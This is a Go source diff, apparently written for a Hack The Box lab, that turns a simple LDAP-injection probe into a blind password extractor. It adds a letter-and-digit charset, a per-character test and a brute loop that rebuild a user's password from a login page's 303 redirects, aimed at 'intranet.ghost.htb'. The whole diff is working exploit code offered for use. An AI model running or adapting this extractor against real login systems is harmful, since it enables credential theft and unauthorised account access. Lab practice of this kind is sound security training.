@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"strconv"
 	"strings"
 )
 
@@ -10,6 +11,7 @@ import (
 type LdapInjector struct {
 	Url string
 	Username string
+	Charset string
 }
 
 // Initialize ldap-injector properties
@@ -17,6 +19,7 @@ func NewLdapInjector(url, username string) *LdapInjector {
 	return &LdapInjector{
 		Url: url,
 		Username: username,
+		Charset: CreateCharset(),
 	}
 }
 
@@ -46,12 +49,50 @@ func (li *LdapInjector) TestPassword(password string) (bool, error) {
 	return resp.StatusCode == 303, nil
 }
 
+func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
+	for _, c := range li.Charset {
+		ok, err := li.TestPassword(fmt.Sprintf("%s%s", prefix, string(c))); if err != nil {
+			return "", err
+		} else if ok {
+			return string(c), nil
+		}
+	}
+
+	return "", nil
+}
+
+func (li *LdapInjector) Brute() (string, error) {
+	var result string
+	for {
+		c, err := li.TestCharacter(result); if err != nil {
+			return "", err
+		}
+		if c == "" {
+			break
+		}
+		result += c
+	}
+	return result, nil
+}
+
+func CreateCharset () string {
+	var charset string
+	for c := 'a'; c <= 'z'; c++ {
+		charset += string(c)
+	}
+	for i:= range 10 {
+		c := strconv.Itoa(i)
+		charset += string(c)
+	}
+	return charset
+}
+
 func main () {
 	c := NewLdapInjector("http://intranet.ghost.htb:8008/login", "gitea_temp_principal")
-	resp, err := c.TestPassword("*")
+	password, err := c.Brute()
 	if err != nil {
 		fmt.Println("Error:", err)
 		return
 	}
-	fmt.Println("Response:", resp)
+	fmt.Println(password)
 }
